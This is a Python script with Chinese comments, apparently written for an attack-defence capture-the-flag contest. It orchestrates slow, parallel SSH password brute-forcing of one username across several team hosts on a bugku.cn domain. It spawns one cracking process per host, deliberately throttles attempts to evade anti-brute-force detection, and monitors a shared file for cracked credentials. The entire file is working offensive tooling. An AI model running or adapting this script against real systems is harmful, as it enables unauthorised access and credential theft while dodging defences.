#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
多队并行 SSH 慢爆控制器 - 对多个存活队伍同一用户, 用规则词表低频爆破.
每队独立进程, 避免单队高并发触发防爆破; 命中任一即记录并继续其他队.
用法: python3 ssh_brute_teams.py <user> <wordlist> [delay] [teams...]
"""
import sys, os, tempfile, subprocess, time

SCRIPT = "/root/Documents/trae_projects/awd-AI/attack/ssh_fast.py"


def main():
    user = sys.argv[1]
    wordlist = sys.argv[2]
    delay = float(sys.argv[3]) if len(sys.argv) > 3 else 2.5
    teams = sys.argv[4:] if len(sys.argv) > 4 else ["31", "72", "91", "98", "119", "189", "192"]

    procs = {}
    for t in teams:
        host = f"192-168-1-{t}.pvp7604.bugku.cn"
        logf = f"/tmp/ssh_team_{t}_{user}.log"
        # ssh_fast.py 的 checkpoint 基于 host+user, 天然按队隔离
        p = subprocess.Popen(
            [sys.executable, SCRIPT, host, user, wordlist, str(delay)],
            stdout=open(logf, "a"), stderr=subprocess.STDOUT,
            env=os.environ.copy(),
        )
        procs[t] = p
        print(f"[+] 启动 {user}@{t} (pid {p.pid}) delay={delay}", flush=True)

    # 监控: 若任一命中(ssh_hit.txt 出现该行的host)则报告
    try:
        while True:
            time.sleep(10)
            if os.path.exists("/tmp/ssh_hit.txt"):
                hits = open("/tmp/ssh_hit.txt").read().splitlines()
                dead = [t for t, p in procs.items() if p.poll() is not None]
                if hits:
                    print(f"[*] hits so far: {hits}", flush=True)
                if len(dead) == len(procs):
                    print("[+] 所有队伍爆破线程已结束", flush=True)
                    break
    except KeyboardInterrupt:
        pass
    finally:
        for t, p in procs.items():
            if p.poll() is None:
                p.terminate()
    print("[done]")


if __name__ == "__main__":
    main()
